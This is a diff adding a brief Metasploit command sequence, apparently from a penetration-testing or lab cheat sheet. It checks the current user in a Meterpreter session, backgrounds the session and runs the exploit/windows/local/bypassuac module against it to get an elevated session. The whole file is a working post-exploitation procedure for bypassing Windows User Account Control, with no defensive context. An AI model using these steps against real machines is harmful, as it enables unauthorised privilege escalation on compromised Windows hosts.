@@ -1,0 +1,14 @@
+# Check current privilege
+getuid
+
+# Background session
+background
+
+# Use BypassUAC exploit
+use exploit/windows/local/bypassuac
+set SESSION <session_id>
+run
+
+# After new session opens
+sessions
+getuid
